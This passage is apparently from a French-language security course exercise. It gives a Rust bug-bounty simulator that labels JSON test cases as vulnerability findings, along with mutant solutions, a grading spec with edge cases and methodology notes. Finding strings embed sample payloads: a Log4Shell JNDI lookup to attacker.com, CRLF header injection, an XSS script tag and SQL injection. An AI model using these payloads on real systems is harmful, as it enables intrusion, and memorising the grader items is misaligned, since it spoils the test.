            remediation: "Use a hardcoded domain for password reset links. Validate Host header.".to_string(),
            chain: None,
            is_duplicate: false,
            cwe: "CWE-640".to_string(),
        })
    } else if token_predictable {
        Some(Finding {
            title: "Predictable Password Reset Token".to_string(),
            severity: "HIGH".to_string(),
            cvss: 8.1,
            description: "Password reset tokens are generated using predictable patterns".to_string(),
            reproduction_steps: vec![
                "1. Request multiple password resets".to_string(),
                "2. Analyze token generation pattern".to_string(),
                "3. Predict tokens for other users".to_string(),
            ],
            impact: "Account takeover by predicting reset tokens".to_string(),
            remediation: "Use cryptographically secure random tokens with sufficient entropy.".to_string(),
            chain: None,
            is_duplicate: false,
            cwe: "CWE-640".to_string(),
        })
    } else {
        None
    }
}

fn analyze_log_injection(test_case: &TestCase, input: &BugBountyInput) -> Option<Finding> {
    let log4j_version = test_case.extra.get("log4j_version")
        .and_then(|v| v.as_str()).unwrap_or("");
    let jndi_reachable = test_case.extra.get("jndi_reachable")
        .and_then(|v| v.as_bool()).unwrap_or(false);

    // Check for Log4Shell (CVE-2021-44228)
    if is_vulnerable_log4j(log4j_version) && jndi_reachable {
        Some(Finding {
            title: "Log4Shell (CVE-2021-44228) - Remote Code Execution".to_string(),
            severity: "CRITICAL".to_string(),
            cvss: 10.0,
            description: "Application uses vulnerable Log4j version allowing JNDI injection".to_string(),
            reproduction_steps: vec![
                "1. Identify logging injection point (User-Agent, X-Forwarded-For)".to_string(),
                "2. Start LDAP server with malicious payload".to_string(),
                "3. Send: ${jndi:ldap://attacker.com/exploit}".to_string(),
                "4. Server fetches and executes malicious class".to_string(),
            ],
            impact: "Remote Code Execution with application privileges".to_string(),
            remediation: "Upgrade Log4j to 2.17.0+. Set log4j2.formatMsgNoLookups=true.".to_string(),
            chain: None,
            is_duplicate: false,
            cwe: "CWE-502".to_string(),
        })
    } else {
        None
    }
}

fn is_vulnerable_log4j(version: &str) -> bool {
    // Versions 2.0-beta9 to 2.14.1 are vulnerable
    if version.is_empty() { return false; }
    let vulnerable_versions = ["2.0", "2.1", "2.2", "2.3", "2.4", "2.5", "2.6", "2.7",
                               "2.8", "2.9", "2.10", "2.11", "2.12", "2.13", "2.14"];
    vulnerable_versions.iter().any(|v| version.starts_with(v))
}

fn analyze_crlf(test_case: &TestCase) -> Option<Finding> {
    let injectable = test_case.extra.get("crlf_injectable")
        .and_then(|v| v.as_bool()).unwrap_or(false);

    if injectable {
        Some(Finding {
            title: "CRLF Injection / HTTP Response Splitting".to_string(),
            severity: "MEDIUM".to_string(),
            cvss: 5.4,
            description: "Application reflects user input in HTTP headers without sanitization".to_string(),
            reproduction_steps: vec![
                "1. Find parameter reflected in response headers".to_string(),
                "2. Inject: %0d%0aSet-Cookie: evil=value".to_string(),
                "3. Observe injected header in response".to_string(),
            ],
            impact: "Session fixation, cache poisoning, XSS via injected headers".to_string(),
            remediation: "Sanitize CRLF characters from user input used in headers.".to_string(),
            chain: None,
            is_duplicate: false,
            cwe: "CWE-113".to_string(),
        })
    } else {
        None
    }
}

fn analyze_xss(test_case: &TestCase) -> Option<Finding> {
    let xss_type = test_case.extra.get("xss_type")
        .and_then(|v| v.as_str()).unwrap_or("");

    if !xss_type.is_empty() {
        let (severity, cvss) = match xss_type {
            "stored" => ("HIGH", 8.1),
            "reflected" => ("MEDIUM", 6.1),
            "dom" => ("MEDIUM", 6.1),
            _ => ("LOW", 4.3),
        };

        Some(Finding {
            title: format!("{} Cross-Site Scripting (XSS)", capitalize(xss_type)),
            severity: severity.to_string(),
            cvss,
            description: format!("{} XSS vulnerability allows script injection", capitalize(xss_type)),
            reproduction_steps: vec![
                "1. Navigate to vulnerable endpoint".to_string(),
                format!("2. Inject payload: <script>alert(1)</script>"),
                "3. Observe script execution".to_string(),
            ],
            impact: "Session hijacking, credential theft, defacement".to_string(),
            remediation: "Implement context-aware output encoding. Use CSP.".to_string(),
            chain: None,
            is_duplicate: false,
            cwe: "CWE-79".to_string(),
        })
    } else {
        None
    }
}

fn analyze_sqli(test_case: &TestCase) -> Option<Finding> {
    let vulnerable = test_case.extra.get("vulnerable")
        .and_then(|v| v.as_bool()).unwrap_or(false);

    if vulnerable {
        Some(Finding {
            title: "SQL Injection".to_string(),
            severity: "CRITICAL".to_string(),
            cvss: 9.8,
            description: "SQL injection vulnerability allows database manipulation".to_string(),
            reproduction_steps: vec![
                "1. Identify injection point".to_string(),
                "2. Test with: ' OR '1'='1".to_string(),
                "3. Extract data using UNION-based or blind techniques".to_string(),
            ],
            impact: "Data breach, authentication bypass, potential RCE".to_string(),
            remediation: "Use parameterized queries. Implement input validation.".to_string(),
            chain: None,
            is_duplicate: false,
            cwe: "CWE-89".to_string(),
        })
    } else {
        None
    }
}

fn analyze_serverless(test_case: &TestCase) -> Option<Finding> {
    let env_exposed = test_case.extra.get("env_variables_exposed")
        .and_then(|v| v.as_bool()).unwrap_or(false);
    let timeout_exploitable = test_case.extra.get("timeout_exploitable")
        .and_then(|v| v.as_bool()).unwrap_or(false);

    if env_exposed {
        Some(Finding {
            title: "Serverless Function Environment Variable Exposure".to_string(),
            severity: "MEDIUM".to_string(),
            cvss: 6.5,
            description: "Lambda/Cloud Function exposes environment variables including secrets".to_string(),
            reproduction_steps: vec![
                "1. Trigger error condition in function".to_string(),
                "2. Error response includes environment dump".to_string(),
                "3. Extract AWS keys, database credentials, etc.".to_string(),
            ],
            impact: "Credential leakage, lateral movement to other services".to_string(),
            remediation: "Use secrets manager. Never expose errors with env details.".to_string(),
            chain: None,
            is_duplicate: false,
            cwe: "CWE-215".to_string(),
        })
    } else {
        None
    }
}

fn analyze_wasm(test_case: &TestCase) -> Option<Finding> {
    let memory_exposed = test_case.extra.get("linear_memory_exposed")
        .and_then(|v| v.as_bool()).unwrap_or(false);

    if memory_exposed {
        Some(Finding {
            title: "WebAssembly Linear Memory Exposure".to_string(),
            severity: "LOW".to_string(),
            cvss: 4.3,
            description: "WASM module exposes linear memory to JavaScript without proper bounds".to_string(),
            reproduction_steps: vec![
                "1. Access WASM module's memory from JS".to_string(),
                "2. Read beyond intended boundaries".to_string(),
                "3. Extract sensitive data from memory".to_string(),
            ],
            impact: "Information disclosure, potential memory corruption".to_string(),
            remediation: "Implement proper memory bounds checking. Minimize JS-WASM interface.".to_string(),
            chain: None,
            is_duplicate: false,
            cwe: "CWE-119".to_string(),
        })
    } else {
        None
    }
}

fn analyze_info_disclosure(test_case: &TestCase) -> Option<Finding> {
    Some(Finding {
        title: "Information Disclosure".to_string(),
        severity: "LOW".to_string(),
        cvss: 3.1,
        description: "Application exposes sensitive information".to_string(),
        reproduction_steps: vec![
            "1. Access the vulnerable endpoint".to_string(),
            "2. Observe disclosed information".to_string(),
        ],
        impact: "Information leakage aiding further attacks".to_string(),
        remediation: "Remove sensitive information from responses.".to_string(),
        chain: None,
        is_duplicate: false,
        cwe: "CWE-200".to_string(),
    })
}

fn analyze_application_info(app_info: &ApplicationInfo, scope: &TargetScope) -> Vec<Finding> {
    let mut findings = Vec::new();

    // Check for known vulnerable components
    for tech in &app_info.tech_stack {
        if tech.contains("Log4j 2.14") || tech.contains("Log4j 2.13") {
            findings.push(Finding {
                title: "Vulnerable Log4j Version Detected".to_string(),
                severity: "CRITICAL".to_string(),
                cvss: 10.0,
                description: format!("Tech stack includes vulnerable {}", tech),
                reproduction_steps: vec!["See Log4Shell exploitation steps".to_string()],
                impact: "Remote Code Execution".to_string(),
                remediation: "Upgrade to Log4j 2.17.0+".to_string(),
                chain: None,
                is_duplicate: false,
                cwe: "CWE-502".to_string(),
            });
        }
    }

    findings
}

fn detect_chains(findings: &[Finding]) -> Vec<VulnerabilityChain> {
    let mut chains = Vec::new();

    // Look for XSS that can be chained
    let has_xss = findings.iter().any(|f| f.cwe == "CWE-79");
    let has_csrf = findings.iter().any(|f| f.title.contains("CSRF"));
    let has_session = findings.iter().any(|f| f.title.contains("Session") || f.title.contains("Cookie"));

    if has_xss {
        chains.push(VulnerabilityChain {
            chain_type: "xss_chain".to_string(),
            steps: vec![
                "XSS payload injection".to_string(),
                "Session cookie theft".to_string(),
                "Account takeover".to_string(),
            ],
            combined_impact: "Full account compromise via XSS".to_string(),
            combined_cvss: 8.5,
        });
    }

    // SAML + Privilege Escalation chain
    let has_saml = findings.iter().any(|f| f.title.contains("SAML"));
    if has_saml {
        chains.push(VulnerabilityChain {
            chain_type: "auth_bypass_chain".to_string(),
            steps: vec![
                "SAML signature bypass".to_string(),
                "Forge admin assertion".to_string(),
                "Administrative access".to_string(),
            ],
            combined_impact: "Full administrative access".to_string(),
            combined_cvss: 9.8,
        });
    }

    chains
}

fn calculate_bounty(findings: &[Finding], bounty_program: &Option<BountyProgram>) -> u32 {
    let default_ranges = BountyProgram {
        critical: BountyRange { min: 5000, max: 15000 },
        high: BountyRange { min: 2000, max: 5000 },
        medium: BountyRange { min: 500, max: 2000 },
        low: BountyRange { min: 100, max: 500 },
    };

    let ranges = bounty_program.as_ref().unwrap_or(&default_ranges);
    let mut total = 0u32;

    for finding in findings {
        if finding.is_duplicate {
            continue;
        }
        let range = match finding.severity.as_str() {
            "CRITICAL" => &ranges.critical,
            "HIGH" => &ranges.high,
            "MEDIUM" => &ranges.medium,
            "LOW" => &ranges.low,
            _ => &ranges.low,
        };
        // Use midpoint of range
        total += (range.min + range.max) / 2;
    }

    total
}

fn capitalize(s: &str) -> String {
    let mut chars = s.chars();
    match chars.next() {
        None => String::new(),
        Some(c) => c.to_uppercase().collect::<String>() + chars.as_str(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_saml_bypass_detection() {
        let input = r#"{"target_scope":{"domains":["*.test.com"],"out_of_scope":[]},"test_cases":[{"id":"1","type":"saml_analysis","saml_response":{"signature_validated":false}}]}"#;
        let result: Value = serde_json::from_str(&bug_bounty_simulation(input)).unwrap();
        assert_eq!(result["findings"][0]["severity"], "CRITICAL");
    }

    #[test]
    fn test_out_of_scope() {
        let input = r#"{"target_scope":{"domains":["*.test.com"],"out_of_scope":["blog.test.com"]},"test_cases":[{"id":"1","type":"xss_analysis","endpoint":"https://blog.test.com/search","xss_type":"reflected"}]}"#;
        let result: Value = serde_json::from_str(&bug_bounty_simulation(input)).unwrap();
        assert_eq!(result["findings"].as_array().unwrap().len(), 0);
    }
}
```

### 4.4 Solutions alternatives acceptées

```rust
// Alternative 1: Approche avec pattern matching exhaustif
fn analyze_test_case_v2(test_case: &TestCase, input: &BugBountyInput) -> Option<Finding> {
    let analyzers: HashMap<&str, fn(&TestCase, &BugBountyInput) -> Option<Finding>> = HashMap::from([
        ("saml_analysis", analyze_saml as fn(&TestCase, &BugBountyInput) -> Option<Finding>),
        ("websocket_analysis", |tc, _| analyze_websocket(tc)),
        // ... autres analyseurs
    ]);

    analyzers.get(test_case.test_type.as_str())
        .and_then(|f| f(test_case, input))
}

// Alternative 2: Builder pattern pour les findings
struct FindingBuilder {
    title: Option<String>,
    severity: Option<String>,
    cvss: Option<f64>,
    // ...
}

impl FindingBuilder {
    fn new() -> Self { /* ... */ }
    fn title(mut self, t: &str) -> Self { self.title = Some(t.to_string()); self }
    fn severity(mut self, s: &str) -> Self { self.severity = Some(s.to_string()); self }
    fn build(self) -> Result<Finding, &'static str> { /* ... */ }
}
```

### 4.5 Solutions refusées (avec explications)

```rust
// ❌ REFUSÉ: Pas de vérification du scope
fn bad_analyze_no_scope_check(test_cases: &[TestCase]) -> Vec<Finding> {
    // ERREUR: Analyse tous les test cases sans vérifier le scope
    test_cases.iter()
        .filter_map(|tc| analyze_test_case_basic(tc))
        .collect()
    // Pourquoi c'est faux: Les targets out-of-scope ne doivent jamais être testées
}

// ❌ REFUSÉ: CVSS hardcodé sans calcul
fn bad_fixed_cvss() -> Finding {
    Finding {
        cvss: 9.8, // ERREUR: Toujours CRITICAL
        // Le CVSS doit être calculé selon le type de vulnérabilité
        ..Default::default()
    }
}

// ❌ REFUSÉ: Pas de détection de duplicates
fn bad_no_duplicate_check(findings: Vec<Finding>) -> Vec<Finding> {
    findings // ERREUR: Retourne tous les findings sans vérifier les duplicates
}
```

### 4.6 Solution bonus de référence (COMPLÈTE)

```rust
// Solution bonus avec ML-like pattern learning
pub fn bug_bounty_simulation_ml(input_json: &str, training_data: &str) -> String {
    let input: BugBountyInput = serde_json::from_str(input_json).unwrap();
    let patterns: Vec<VulnPattern> = serde_json::from_str(training_data).unwrap_or_default();

    let mut findings = Vec::new();
    let mut learned_patterns: HashMap<String, f64> = HashMap::new();

    // Learn from training data
    for pattern in &patterns {
        let key = format!("{}:{}", pattern.vuln_type, pattern.context);
        *learned_patterns.entry(key).or_insert(0.0) += pattern.confidence;
    }

    // Apply learned patterns
    for test_case in &input.test_cases {
        let predicted_vulns = predict_vulnerabilities(&test_case, &learned_patterns);
        for (vuln_type, confidence) in predicted_vulns {
            if confidence > 0.7 {
                if let Some(finding) = create_finding_from_prediction(&vuln_type, confidence) {
                    findings.push(finding);
                }
            }
        }
    }

    // Auto-chain discovery using graph
    let chains = discover_chains_graph(&findings);

    serde_json::to_string_pretty(&BugBountyMLOutput {
        findings,
        chains,
        model_confidence: calculate_model_confidence(&learned_patterns),
        predictions: generate_predictions(&input, &learned_patterns),
    }).unwrap()
}

#[derive(Deserialize)]
struct VulnPattern {
    vuln_type: String,
    context: String,
    confidence: f64,
}

fn predict_vulnerabilities(tc: &TestCase, patterns: &HashMap<String, f64>) -> Vec<(String, f64)> {
    let mut predictions = Vec::new();
    for (pattern, confidence) in patterns {
        if pattern.contains(&tc.test_type) {
            predictions.push((pattern.clone(), *confidence));
        }
    }
    predictions.sort_by(|a, b| b.1.partial_cmp(&a.1).unwrap());
    predictions
}
```

### 4.10 Solutions Mutantes (6 mutants)

```rust
// Mutant A (Boundary): Off-by-one dans le calcul CVSS
fn mutant_boundary_cvss(severity: &str) -> f64 {
    match severity {
        "CRITICAL" => 9.9, // ERREUR: Devrait être 9.0-10.0 range
        "HIGH" => 7.9,      // ERREUR: Devrait être 7.0-8.9
        "MEDIUM" => 4.9,    // ERREUR: Devrait être 4.0-6.9
        "LOW" => 0.0,       // ERREUR: Devrait être 0.1-3.9
        _ => 0.0,
    }
    // Bug: Les bornes sont incorrectes, causant des scores invalides
}

// Mutant B (Safety): Pas de vérification NULL/empty
fn mutant_safety_no_check(input_json: &str) -> String {
    let input: BugBountyInput = serde_json::from_str(input_json).unwrap(); // CRASH si invalide
    // ERREUR: Pas de gestion d'erreur, panic sur JSON invalide
    process_input(&input)
}

// Mutant C (Resource): Fuite de mémoire avec accumulation infinie
fn mutant_resource_leak(findings: &mut Vec<Finding>, new_finding: Finding) {
    findings.push(new_finding);
    findings.push(new_finding.clone()); // ERREUR: Double ajout
    // Bug: Chaque finding est ajouté deux fois, croissance mémoire x2
}

// Mutant D (Logic): Logique inversée pour out-of-scope
fn mutant_logic_inverted_scope(endpoint: &str, out_of_scope: &[String]) -> bool {
    for oos in out_of_scope {
        if endpoint.contains(oos) {
            return false; // ERREUR: Devrait retourner true (IS out of scope)
        }
    }
    true // ERREUR: Devrait retourner false (is NOT out of scope)
    // Bug: La logique est complètement inversée
}

// Mutant E (Return): Retourne toujours un tableau vide
fn mutant_return_empty(input: &BugBountyInput) -> Vec<Finding> {
    let _findings = analyze_all_cases(input);
    Vec::new() // ERREUR: Retourne toujours vide au lieu des findings
    // Bug: Tous les findings sont perdus
}

// Mutant F (Edge Case): Ne gère pas les domaines wildcard
fn mutant_edge_wildcard(domain: &str, scope_domains: &[String]) -> bool {
    scope_domains.contains(&domain.to_string())
    // ERREUR: "api.target.com" ne match pas "*.target.com"
    // Bug: Les wildcards ne sont pas interprétés
}
```

### 4.9 spec.json (ENGINE v22.1)

```json
{
  "name": "bug_bounty_simulation",
  "language": "rust",
  "version": "edition 2024",
  "type": "complet_2",
  "tier": 3,
  "tier_info": "Synthèse (tous concepts du module)",
  "tags": ["bug-bounty", "web-security", "pentesting", "phase3", "synthesis"],
  "passing_score": 70,

  "function": {
    "name": "bug_bounty_simulation",
    "prototype": "pub fn bug_bounty_simulation(input_json: &str) -> String",
    "return_type": "String",
    "parameters": [
      {"name": "input_json", "type": "&str"}
    ]
  },

  "driver": {
    "reference": "pub fn ref_bug_bounty_simulation(input_json: &str) -> String { let input: BugBountyInput = serde_json::from_str(input_json).unwrap_or_default(); let mut findings = Vec::new(); for tc in &input.test_cases { if !is_out_of_scope(&tc.endpoint, &input.target_scope.out_of_scope) { if let Some(f) = analyze_test_case(&tc) { findings.push(f); } } } serde_json::to_string(&BugBountyOutput { findings, ..Default::default() }).unwrap() }",

    "edge_cases": [
      {
        "name": "saml_signature_bypass",
        "args": ["{\"target_scope\":{\"domains\":[\"*.target.com\"],\"out_of_scope\":[]},\"test_cases\":[{\"id\":\"1\",\"type\":\"saml_analysis\",\"saml_response\":{\"signature_validated\":false}}]}"],
        "expected_contains": "CRITICAL",
        "is_trap": true,
        "trap_explanation": "SAML sans validation de signature = CRITICAL obligatoire"
      },
      {
        "name": "websocket_xss_chain",
        "args": ["{\"target_scope\":{\"domains\":[\"*.target.com\"],\"out_of_scope\":[]},\"test_cases\":[{\"id\":\"1\",\"type\":\"websocket_analysis\",\"message_sanitization\":false,\"stored_messages\":true}]}"],
        "expected_contains": "xss_chain",
        "is_trap": true,
        "trap_explanation": "WebSocket non sanitisé + stocké = chain XSS obligatoire"
      },
      {
        "name": "out_of_scope_ignored",
        "args": ["{\"target_scope\":{\"domains\":[\"*.target.com\"],\"out_of_scope\":[\"blog.target.com\"]},\"test_cases\":[{\"id\":\"1\",\"type\":\"sqli_analysis\",\"endpoint\":\"https://blog.target.com/search\",\"vulnerable\":true}]}"],
        "expected": "{\"findings\":[]}",
        "is_trap": true,
        "trap_explanation": "Les targets out-of-scope doivent être ignorées"
      },
      {
        "name": "cors_with_credentials",
        "args": ["{\"target_scope\":{\"domains\":[\"*.target.com\"],\"out_of_scope\":[]},\"test_cases\":[{\"id\":\"1\",\"type\":\"cors_analysis\",\"cors_config\":{\"allow_origin\":\"reflect\",\"allow_credentials\":true}}]}"],
        "expected_contains": "HIGH",
        "is_trap": false
      },
      {
        "name": "log4shell_detection",
        "args": ["{\"target_scope\":{\"domains\":[\"*.target.com\"],\"out_of_scope\":[]},\"application_info\":{\"tech_stack\":[\"Log4j 2.14.1\"]},\"test_cases\":[{\"id\":\"1\",\"type\":\"log_injection_analysis\",\"log4j_version\":\"2.14.1\",\"jndi_reachable\":true}]}"],
        "expected_contains": "CRITICAL",
        "is_trap": true,
        "trap_explanation": "Log4j vulnérable + JNDI accessible = CRITICAL (CVE-2021-44228)"
      },
      {
        "name": "duplicate_detection",
        "args": ["{\"target_scope\":{\"domains\":[\"*.target.com\"],\"out_of_scope\":[]},\"test_cases\":[{\"id\":\"1\",\"type\":\"xss_analysis\",\"endpoint\":\"/search\",\"xss_type\":\"reflected\"},{\"id\":\"2\",\"type\":\"xss_analysis\",\"endpoint\":\"/search\",\"xss_type\":\"reflected\"}]}"],
        "expected_contains": "is_duplicate",
        "is_trap": true,
        "trap_explanation": "Même vulnérabilité sur même endpoint = duplicate"
      },
      {
        "name": "empty_input",
        "args": ["{\"target_scope\":{\"domains\":[],\"out_of_scope\":[]},\"test_cases\":[]}"],
        "expected_contains": "findings",
        "is_trap": true,
        "trap_explanation": "Input vide doit retourner structure valide avec findings vide"
      },
      {
        "name": "invalid_json",
        "args": ["{invalid json}"],
        "expected_contains": "error",
        "is_trap": true,
        "trap_explanation": "JSON invalide doit retourner erreur propre, pas panic"
      }
    ],

    "fuzzing": {
      "enabled": true,
      "iterations": 500,
      "generators": [
        {
          "type": "object",
          "param_index": 0,
          "params": {
            "schema": "BugBountyInput",
            "randomize_test_cases": true,
            "max_test_cases": 20
          }
        }
      ]
    }
  },

  "norm": {
    "allowed_functions": ["serde_json::*", "std::collections::*", "regex::*"],
    "forbidden_functions": ["std::net::*", "std::fs::*", "reqwest::*"],
    "check_security": true,
    "check_memory": true,
    "blocking": true
  }
}
```

---

## 🧠 SECTION 5 : COMPRENDRE (DOCUMENT DE COURS COMPLET)

### 5.1 Ce que cet exercice enseigne

Cet exercice de synthèse couvre **18 concepts** de sécurité web dans une simulation réaliste de bug bounty :

| Domaine | Concepts | Impact |
|---------|----------|--------|
| **Authentification** | SAML, MFA Bypass, Password Reset | Account Takeover |
| **Injection** | Log4Shell, CRLF, XSS | RCE, Data Breach |
| **Configuration** | CORS, WebSocket, Serverless | Data Exfiltration |
| **Architecture** | WASM, Insecure Design | Multiple |

### 5.2 LDA — Traduction littérale en français (MAJUSCULES)

```
FONCTION bug_bounty_simulation QUI RETOURNE UNE CHAÎNE ET PREND EN PARAMÈTRE input_json QUI EST UNE RÉFÉRENCE VERS UNE CHAÎNE
DÉBUT FONCTION
    DÉCLARER input COMME STRUCTURE BugBountyInput
    AFFECTER LE RÉSULTAT DE PARSER input_json EN JSON À input
    SI ERREUR DE PARSING ALORS
        RETOURNER UN JSON D'ERREUR
    FIN SI

    DÉCLARER findings COMME VECTEUR DE Finding VIDE
    DÉCLARER seen_vulns COMME ENSEMBLE DE CHAÎNES VIDE
    DÉCLARER out_of_scope_count COMME ENTIER ÉGAL À 0

    POUR CHAQUE test_case DANS input.test_cases FAIRE
        SI L'ENDPOINT DE test_case EST DANS out_of_scope ALORS
            INCRÉMENTER out_of_scope_count
            CONTINUER À L'ITÉRATION SUIVANTE
        FIN SI

        DÉCLARER finding COMME RÉSULTAT DE analyze_test_case(test_case)
        SI finding EXISTE ALORS
            DÉCLARER vuln_hash COMME CONCATÉNATION DE finding.title ET endpoint
            SI vuln_hash EST DANS seen_vulns ALORS
                MARQUER finding COMME DUPLICATE
            SINON
                AJOUTER vuln_hash À seen_vulns
            FIN SI
            AJOUTER finding À findings
        FIN SI
    FIN POUR

    TRIER findings PAR CVSS DÉCROISSANT
    DÉCLARER chains COMME RÉSULTAT DE detect_chains(findings)
    DÉCLARER bounty COMME RÉSULTAT DE calculate_bounty(findings)

    RETOURNER LA STRUCTURE BugBountyOutput SÉRIALISÉE EN JSON
FIN FONCTION
```

### 5.2.2 Logic Flow (Structured English)

```
ALGORITHME : Bug Bounty Simulation
---
1. PARSER l'entrée JSON en structure BugBountyInput
   - Si erreur → RETOURNER message d'erreur JSON

2. INITIALISER collections :
   - findings = []
   - seen_vulns = Set()
   - chains = []

3. POUR CHAQUE test_case :
   a. VÉRIFIER si endpoint est in-scope
      - Si out-of-scope → SKIP et incrémenter compteur

   b. ANALYSER selon le type :
      - "saml_analysis" → check_saml_vulnerabilities()
      - "websocket_analysis" → check_websocket_vulnerabilities()
      - "cors_analysis" → check_cors_misconfiguration()
      - "log_injection" → check_log4shell()
      - ... autres analyseurs

   c. SI vulnérabilité trouvée :
      - CALCULER hash unique (title + endpoint)
      - SI hash existe → marquer comme duplicate
      - AJOUTER à findings

4. POST-TRAITEMENT :
   a. TRIER findings par CVSS décroissant
   b. DÉTECTER chains (XSS→Session, SAML→Admin)
   c. CALCULER bounty estimé

5. GÉNÉRER rapport avec toutes les sections

6. RETOURNER JSON structuré
```

### 5.2.3 Représentation Algorithmique (Logique de Garde)

```
FONCTION : analyze_test_case (test_case)
---
INIT result = None

1. GUARD: Vérifier type de test valide
   |
   |-- SI type inconnu :
   |     RETOURNER None
   |
   |-- SELON type :
   |
   |     CAS "saml_analysis" :
   |     |-- VÉRIFIER signature_validated
   |     |     SI false → CRÉER finding CRITICAL (CVSS 9.8)
   |     |-- VÉRIFIER claims_modifiable
   |     |     SI true → CRÉER finding CRITICAL
   |     |-- RETOURNER finding ou None
   |
   |     CAS "cors_analysis" :
   |     |-- EXTRAIRE cors_config
   |     |-- GUARD: allow_origin == "reflect" ET allow_credentials == true
   |     |     SI true → CRÉER finding HIGH (CVSS 7.5)
   |     |-- RETOURNER finding ou None
   |
   |     CAS "log_injection_analysis" :
   |     |-- VÉRIFIER log4j_version vulnérable (2.0-2.14.x)
   |     |-- VÉRIFIER jndi_reachable
   |     |     SI les deux → CRÉER finding CRITICAL (CVSS 10.0)
   |     |-- RETOURNER finding ou None

2. RETOURNER result
```

### 5.2.3.1 Diagramme Mermaid (Flow Principal)

```mermaid
graph TD
    A[Début: bug_bounty_simulation] --> B{JSON valide ?}
    B -- Non --> C[Retourner erreur]
    B -- Oui --> D[Parser en BugBountyInput]

    D --> E[Pour chaque test_case]
    E --> F{Endpoint in-scope ?}

    F -- Non --> G[Skip + compteur++]
    G --> E

    F -- Oui --> H[analyze_test_case]
    H --> I{Finding trouvé ?}

    I -- Non --> E
    I -- Oui --> J{Déjà vu ?}

    J -- Oui --> K[Marquer duplicate]
    J -- Non --> L[Ajouter au set]

    K --> M[Ajouter aux findings]
    L --> M
    M --> E

    E -- Fin boucle --> N[Trier par CVSS]
    N --> O[Détecter chains]
    O --> P[Calculer bounty]
    P --> Q[Générer rapport]
    Q --> R[Retourner JSON]
```



### 5.3 Visualisation ASCII

```
                    BUG BOUNTY SIMULATION FLOW
    ┌─────────────────────────────────────────────────────────────┐
    │                                                             │
    │  INPUT                           PROCESSING                 │
    │  ┌─────────────────┐            ┌─────────────────────────┐│
    │  │ Target Scope    │───────────▶│ Scope Filter            ││
    │  │ • domains: [*]  │            │ ├─ in_scope? ✓          ││
    │  │ • out_of_scope  │            │ └─ out_of_scope? ✗      ││
    │  └─────────────────┘            └──────────┬──────────────┘│
    │                                            │               │
    │  ┌─────────────────┐            ┌──────────▼──────────────┐│
    │  │ Test Cases      │───────────▶│ Vulnerability Analyzer  ││
    │  │ • saml          │            │ ├─ SAML Bypass          ││
    │  │ • websocket     │            │ ├─ WebSocket XSS        ││
    │  │ • cors          │            │ ├─ CORS Misconfig       ││
    │  │ • log4j         │            │ ├─ Log4Shell            ││
    │  │ • mfa           │            │ └─ ... (18 types)       ││
    │  └─────────────────┘            └──────────┬──────────────┘│
    │                                            │               │
    │                                 ┌──────────▼──────────────┐│
    │                                 │ Duplicate Detector      ││
    │                                 │ hash(title + endpoint)  ││
    │                                 └──────────┬──────────────┘│
    │                                            │               │
    │  OUTPUT                         ┌──────────▼──────────────┐│
    │  ┌─────────────────┐            │ Chain Detector          ││
    │  │ Findings        │◀───────────│ XSS → Session → ATO     ││
    │  │ ├─ CRITICAL: 2  │            │ SAML → Admin Access     ││
    │  │ ├─ HIGH: 3      │            └──────────┬──────────────┘│
    │  │ ├─ MEDIUM: 2    │                       │               │
    │  │ └─ LOW: 1       │            ┌──────────▼──────────────┐│
    │  ├─ Chains: 2      │◀───────────│ Bounty Calculator       ││
    │  ├─ Bounty: $18.5k │            │ CRIT: $10k, HIGH: $3.5k ││
    │  └─ Quality: 5/5   │            └─────────────────────────┘│
    │                                                             │
    └─────────────────────────────────────────────────────────────┘
```

### 5.4 Les pièges en détail

#### Piège 1 : Ignorer le scope
```rust
// ❌ MAUVAIS : Analyser tout sans vérifier le scope
for tc in &test_cases {
    findings.push(analyze(tc)); // Inclut les out-of-scope!
}

// ✅ BON : Toujours vérifier le scope d'abord
for tc in &test_cases {
    if !is_out_of_scope(&tc.endpoint, &out_of_scope) {
        if let Some(f) = analyze(tc) {
            findings.push(f);
        }
    }
}
```

#### Piège 2 : Ne pas détecter les duplicates
```rust
// ❌ MAUVAIS : Ajouter tous les findings
findings.extend(new_findings);

// ✅ BON : Vérifier les duplicates
let hash = format!("{}:{}", finding.title, endpoint);
if seen.insert(hash) {
    findings.push(finding);
} else {
    finding.is_duplicate = true;
    findings.push(finding);
}
```

#### Piège 3 : CVSS incorrect
```rust
// ❌ MAUVAIS : CVSS hardcodé
let cvss = 9.8; // Toujours critique?

// ✅ BON : CVSS calculé selon les critères
let cvss = match severity {
    "CRITICAL" => calculate_cvss_critical(&impact),
    "HIGH" => calculate_cvss_high(&impact),
    _ => calculate_cvss_base(&finding),
};
```

### 5.5 Cours Complet : Méthodologie Bug Bounty

#### 5.5.1 Les Phases d'un Bug Bounty

```
┌─────────────────────────────────────────────────────────────────┐
│                    MÉTHODOLOGIE BUG BOUNTY                      │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  PHASE 1: RECONNAISSANCE (20% du temps)                        │
│  ├── Passive: OSINT, Wayback, certificate transparency         │
│  ├── Active: Subdomain enum, port scanning, tech fingerprint   │
│  └── JS Analysis: LinkFinder, endpoints, secrets               │
│                                                                 │
│  PHASE 2: MAPPING (15% du temps)                                │
│  ├── Sitemap construction                                       │
│  ├── API endpoint discovery                                     │
│  └── Authentication flow analysis                               │
│                                                                 │
│  PHASE 3: VULNERABILITY DISCOVERY (40% du temps)                │
│  ├── Automated: Nuclei, Burp Scanner                           │
│  ├── Manual: Logic flaws, auth bypass, IDOR                    │
│  └── Chaining: Combine low-impact vulns for high impact        │
│                                                                 │
│  PHASE 4: EXPLOITATION (15% du temps)                           │
│  ├── PoC development                                            │
│  ├── Impact demonstration                                       │
│  └── Screenshot/video evidence                                  │
│                                                                 │
│  PHASE 5: REPORTING (10% du temps)                              │
│  ├── Clear title and summary                                    │
│  ├── Step-by-step reproduction                                  │
│  └── Impact and remediation                                     │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

#### 5.5.2 Les 18 Vulnérabilités Clés

| # | Vulnérabilité | CVSS Range | CWE | Impact |
|---|---------------|------------|-----|--------|
| 1 | SAML Bypass | 9.0-10.0 | 347 | Account Takeover |
| 2 | Log4Shell | 10.0 | 502 | RCE |
| 3 | SQL Injection | 8.0-10.0 | 89 | Data Breach |
| 4 | CORS Misconfig | 6.0-8.0 | 942 | Data Theft |
| 5 | WebSocket XSS | 7.0-8.5 | 79 | Session Hijack |
| 6 | MFA Bypass | 6.0-8.0 | 362 | Auth Bypass |
| 7 | Password Reset | 7.0-9.0 | 640 | Account Takeover |
